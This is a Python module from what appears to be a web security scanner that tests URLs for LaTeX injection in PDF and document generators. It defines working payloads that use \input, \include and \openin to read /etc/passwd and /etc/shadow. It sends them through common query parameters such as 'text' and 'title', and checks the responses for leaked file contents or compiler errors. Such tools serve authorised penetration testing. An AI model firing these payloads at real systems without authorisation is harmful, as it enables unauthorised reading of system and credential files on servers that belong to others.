import asyncio
from modules.core import console

# LaTeX Injection Payloads
# Targets: PDF Generators, Document Builders.
# Impact: LFI / RCE.

LATEX_PAYLOADS = [
    "\\input{/etc/passwd}",
    "\\include{/etc/shadow}",
    "\\documentclass{article}\\begin{document}\\input{/etc/passwd}\\end{document}",
    "\\newread\\file\\openin\\file=/etc/passwd\\read\\file to\\line\\line\\closein\\file"
]

async def check_latex(session, url, param):
    try:
        # We inject payloads that try to read /etc/passwd
        for payload in LATEX_PAYLOADS:
            target = f"{url}?{param}={payload}"
            if "?" in url: target = f"{url}&{param}={payload}"
            
            # Note: Result often comes in a generated PDF.
            # We check the raw response text for indications of file content.
            
            async with session.get(target, timeout=10, ssl=False) as resp:
                # We might get a binary blob (PDF)
                content = await resp.read()
                
                # Check for /etc/passwd content indicators in binary or text
                if b"root:x:0:0:" in content or b"daemon:x:" in content:
                     return {
                        "url": target,
                        "param": param,
                        "type": "LaTeX Injection (LFI)",
                        "evidence": "System File Content Found (/etc/passwd)"
                    }
                    
                # Check for LaTeX errors
                if b"LaTeX Error" in content or b"! Emergency stop" in content:
                     return {
                        "url": target,
                        "param": param,
                        "type": "LaTeX Injection (Error)",
                        "evidence": "LaTeX Compiler Error"
                    }

    except Exception:
        pass
    return None

async def scan_latex(session, url):
    """
    Scan for LaTeX Injection (Document Generators).
    """
    console.print(f"\n[bold cyan]--- LaTeX Injection Scanner ---[/bold cyan]")
    
    params = ["text", "content", "title", "body", "doc", "pdf", "name"]
    
    tasks = [check_latex(session, url, p) for p in params]
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] LATEX INJECTION DETECTED: {res['param']}[/bold red]")
             console.print(f"      Type: {res['type']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No LaTeX injection indicators found.[/dim]")
        
    return found
